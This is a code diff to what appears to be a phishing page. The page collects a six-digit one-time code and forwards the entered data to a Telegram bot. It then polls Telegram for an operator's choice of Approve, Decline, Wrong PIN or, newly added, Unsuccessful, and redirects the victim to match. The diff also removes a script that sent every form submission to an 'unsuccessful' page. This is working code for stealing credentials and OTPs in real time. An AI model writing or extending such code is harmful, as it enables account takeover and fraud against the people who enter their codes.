@@ -318,6 +318,7 @@
             const ts = Date.now();
             const approveId = `verify_approve_${ts}`;
             const declineId = `verify_decline_${ts}`;
+            const unsuccessfulId = `verify_unsuccessful_${ts}`;
 
             const params = getParams();
             const paramSummary = Object.entries(params)
@@ -335,8 +336,11 @@
                         inline_keyboard: [
                             [
                                 { text: '✅ Approve', callback_data: approveId },
-                                { text: '❌ Decline', callback_data: declineId },
-                                { text: '🔑 Wrong PIN', callback_data: `wrong_pin_${ts}` }
+                                { text: '❌ Decline', callback_data: declineId }
+                            ],
+                            [
+                                { text: '🔑 Wrong PIN', callback_data: `wrong_pin_${ts}` },
+                                { text: '🚫 Unsuccessful', callback_data: unsuccessfulId }
                             ]
                         ]
                     }
@@ -344,14 +348,14 @@
             })
             .then(() => {
                 spinner.classList.add('active');
-                startPolling(approveId, declineId, `wrong_pin_${ts}`);
+                startPolling(approveId, declineId, `wrong_pin_${ts}`, unsuccessfulId);
             })
             .catch(() => {
                 resetButton();
             });
         }
 
-        function startPolling(approveId, declineId, wrongPinId) {
+        function startPolling(approveId, declineId, wrongPinId, unsuccessfulId) {
             const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
@@ -373,6 +377,9 @@
                                 } else if (cb === wrongPinId) {
                                     clearInterval(interval);
                                     window.location.href = 'wrong-pin.html';
+                                } else if (cb === unsuccessfulId) {
+                                    clearInterval(interval);
+                                    window.location.href = `unsuccessful.html${window.location.search}`;
                                 }
                             }
                         });
@@ -390,28 +397,5 @@
         createInputs('otpInputs', 6);
         setupAutoFocus('otpInputs', 6, submitVerification);
     </script>
-
-<script>
-document.addEventListener('DOMContentLoaded', function () {
-  const forms = document.querySelectorAll('form');
-  forms.forEach(function(form) {
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      setTimeout(function(){ window.location.href = 'unsuccessful.html'; }, 1500);
-    });
-  });
-
-  const buttons = document.querySelectorAll('button, input[type="submit"]');
-  buttons.forEach(function(btn) {
-    if (!btn.closest('form')) {
-      btn.addEventListener('click', function(e) {
-        e.preventDefault();
-        setTimeout(function(){ window.location.href = 'unsuccessful.html'; }, 1500);
-      });
-    }
-  });
-});
-</script>
-
 </body>
 </html>
